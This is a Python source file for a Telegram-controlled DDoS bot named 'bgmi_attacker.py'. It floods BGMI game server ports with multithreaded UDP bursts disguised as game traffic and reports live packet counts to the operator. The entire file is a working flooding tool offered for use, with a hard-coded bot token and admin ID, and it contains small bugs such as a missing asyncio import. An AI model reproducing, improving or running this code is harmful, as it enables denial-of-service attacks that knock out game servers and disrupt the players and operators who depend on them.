# bgmi_attacker.py - Optimized for BGMI/Game Servers
import socket
import threading
import time
import random
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA")
ADMIN_IDS = [int(os.environ.get("ADMIN_ID", 8210011971))]

# BGMI specific ports (commonly used)
BGMI_PORTS = {17406, 17407, 17408, 17409, 17410, 17411, 17412, 17413, 17414, 17415}

attack_running = False
attack_info = {'packets': 0, 'speed': 0}
attack_lock = threading.Lock()
user_data = {}

# ============ BGMI OPTIMIZED ATTACK ============
def bgmi_udp_burst(ip, port, duration):
    """High-speed UDP flood for game servers"""
    global attack_running, attack_info
    end_time = time.time() + duration
    port = int(port)
    
    # Create 50 UDP sockets for parallel sending
    sockets = []
    for _ in range(50):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sockets.append(s)
        except:
            pass
    
    # Game-specific payload (looks like real game traffic)
    payloads = [
        random._urandom(512),   # Small packets
        random._urandom(1024),  # Medium packets  
        random._urandom(256),   # Very small packets
        b'\x01' + random._urandom(63),   # Game heartbeat simulation
        b'\x02' + random._urandom(127),  # Position update simulation
    ]
    
    last_speed_check = time.time()
    packets_since_check = 0
    
    while time.time() < end_time and attack_running:
        for sock in sockets:
            try:
                payload = random.choice(payloads)
                sock.sendto(payload, (ip, port))
                with attack_lock:
                    attack_info['packets'] += 1
                    packets_since_check += 1
            except:
                pass
        
        # Update speed every second
        if time.time() - last_speed_check >= 1:
            with attack_lock:
                attack_info['speed'] = packets_since_check
            packets_since_check = 0
            last_speed_check = time.time()
        
        time.sleep(0.00005)  # 50 microseconds - VERY FAST
    
    for sock in sockets:
        sock.close()

def bgmi_multi_port_attack(ip, ports, duration):
    """Attack multiple ports simultaneously"""
    global attack_running
    threads = []
    for port in ports:
        t = threading.Thread(target=bgmi_udp_burst, args=(ip, port, duration), daemon=True)
        t.start()
        threads.append(t)
    return threads

def launch_bgmi_attack(ip, ports, duration, send_cb):
    global attack_running, attack_info
    
    attack_running = True
    with attack_lock:
        attack_info = {'packets': 0, 'speed': 0, 'ports': ports}
    
    # Start attack on all ports
    num_threads = len(ports) * 30  # 30 threads per port
    all_threads = []
    
    for port in ports:
        for _ in range(30):
            t = threading.Thread(target=bgmi_udp_burst, args=(ip, port, duration), daemon=True)
            t.start()
            all_threads.append(t)
    
    # Monitor
    start = time.time()
    last_update = 0
    
    while attack_running and (time.time() - start) < duration:
        time.sleep(1)
        if time.time() - last_update >= 2:
            last_update = time.time()
            with attack_lock:
                pkt = attack_info['packets']
                spd = attack_info['speed']
            elapsed = int(time.time() - start)
            remaining = duration - elapsed
            progress = int((elapsed / duration) * 20)
            bar = "█" * progress + "░" * (20 - progress)
            
            text = (
                f"💥 *BGMI ATTACK ACTIVE* 💥\n\n"
                f"🎯 Target: `{ip}`\n"
                f"🔌 Ports: `{', '.join(map(str, ports))}`\n"
                f"📦 Packets: `{pkt:,}`\n"
                f"⚡ Speed: `{spd:,}` pps\n"
                f"⏱️ Time: `{elapsed}/{duration}s`\n"
                f"📊 `[{bar}]`\n"
                f"🧵 Threads: `{num_threads}`\n\n"
                f"🔥 *GAME SERVER UNDER ATTACK* 🔥"
            )
            try:
                send_cb(text)
            except:
                pass
    
    attack_running = False
    for t in all_threads:
        t.join(timeout=0.5)
    
    with attack_lock:
        pkt = attack_info['packets']
    text = f"✅ *BGMI ATTACK COMPLETE*\n\n📦 Total: `{pkt:,}` packets\n💥 Avg Speed: `{int(pkt/duration):,}` pps\n🎮 *Game server overwhelmed*"
    try:
        send_cb(text)
    except:
        pass

# ============ TELEGRAM BOT ============
async def start(update, context):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    user_data[uid] = {'step': 'ip'}
    await update.message.reply_text(
        "🔥 *BGMI DDoS BOT* 🔥\n\n"
        "Send target *IP address*:\n"
        "Example: `34.4.26.35`\n\n"
        "⚡ *Features:*\n"
        "• UDP burst mode (50k-200k pps)\n"
        "• Multi-port attack\n"
        "• Game-specific payloads\n"
        "• Real-time speed counter",
        parse_mode='Markdown'
    )

async def handle(update, context):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        return
    
    text = update.message.text.strip()
    step_data = user_data.get(uid, {})
    step = step_data.get('step')
    
    if step == 'ip':
        step_data['ip'] = text
        step_data['step'] = 'ports'
        user_data[uid] = step_data
        
        keyboard = [
            [InlineKeyboardButton("🎮 Single Port (17406)", callback_data="port_single")],
            [InlineKeyboardButton("🔥 Multi Port (17406-17410)", callback_data="port_multi")],
            [InlineKeyboardButton("💀 All BGMI Ports", callback_data="port_all")],
            [InlineKeyboardButton("✏️ Custom Port", callback_data="port_custom")]
        ]
        await update.message.reply_text("🔌 *Select port mode:*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    
    elif step == 'duration':
        try:
            duration = int(text)
            if duration < 10 or duration > 300:
                await update.message.reply_text("❌ Duration 10-300 seconds")
                return
            
            ip = step_data['ip']
            ports = step_data.get('ports', [17406])
            
            confirm_text = (
                f"🔥 *CONFIRM BGMI ATTACK* 🔥\n\n"
                f"🎯 IP: `{ip}`\n"
                f"🔌 Ports: `{ports}`\n"
                f"⏱️ Duration: `{duration}s`\n"
                f"📦 Total threads: `{len(ports) * 30}`\n\n"
                f"⚠️ *Start attack?*"
            )
            keyboard = [[InlineKeyboardButton("✅ START BGMI ATTACK", callback_data=f"bgmi_{ip}_{duration}_{','.join(map(str,ports))}")],
                       [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]]
            
            await update.message.reply_text(confirm_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
            del user_data[uid]
        except:
            await update.message.reply_text("❌ Enter duration (10-300):")

async def button(update, context):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data
    
    if data == "cancel":
        if uid in user_data:
            del user_data[uid]
        await query.edit_message_text("❌ Cancelled")
        return
    
    if data == "port_single":
        user_data[uid]['ports'] = [17406]
        user_data[uid]['step'] = 'duration'
        await query.edit_message_text("✅ Single port: `17406`\n\n⏱️ Send duration (10-300 seconds):", parse_mode='Markdown')
    
    elif data == "port_multi":
        user_data[uid]['ports'] = [17406, 17407, 17408, 17409, 17410]
        user_data[uid]['step'] = 'duration'
        await query.edit_message_text("✅ Multi ports: `17406-17410`\n\n⏱️ Send duration (10-300 seconds):", parse_mode='Markdown')
    
    elif data == "port_all":
        user_data[uid]['ports'] = [17406, 17407, 17408, 17409, 17410, 17411, 17412, 17413, 17414, 17415]
        user_data[uid]['step'] = 'duration'
        await query.edit_message_text("✅ All BGMI ports: `17406-17415`\n\n⏱️ Send duration (10-300 seconds):", parse_mode='Markdown')
    
    elif data == "port_custom":
        user_data[uid]['step'] = 'port_custom'
        await query.edit_message_text("✏️ Enter custom port (1-65535):")
    
    elif data.startswith("bgmi_"):
        parts = data.split("_")
        ip = parts[1]
        duration = int(parts[2])
        ports = [int(p) for p in parts[3].split(',')]
        
        loop = asyncio.get_event_loop()
        def send_cb(text):
            asyncio.run_coroutine_threadsafe(query.message.reply_text(text, parse_mode='Markdown'), loop)
        
        await query.edit_message_text(f"🚀 **BGMI ATTACK LAUNCHING**\n\n🎯 Target: {ip}\n🔌 Ports: {ports}\n⏱️ Duration: {duration}s\n\n_Sending packets..._", parse_mode='Markdown')
        
        threading.Thread(target=launch_bgmi_attack, args=(ip, ports, duration, send_cb), daemon=True).start()

async def stop(update, context):
    global attack_running
    attack_running = False
    await update.message.reply_text("🛑 Attack stopped")

async def myinfo(update, context):
    uid = update.effective_user.id
    await update.message.reply_text(f"📋 *Your ID:* `{uid}`\n✅ *Status:* Admin", parse_mode='Markdown')

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle))
    
    print("💥 BGMI DDoS Bot Started!")
    print("🎮 Ready to attack game servers")
    app.run_polling()

if __name__ == "__main__":
    main()
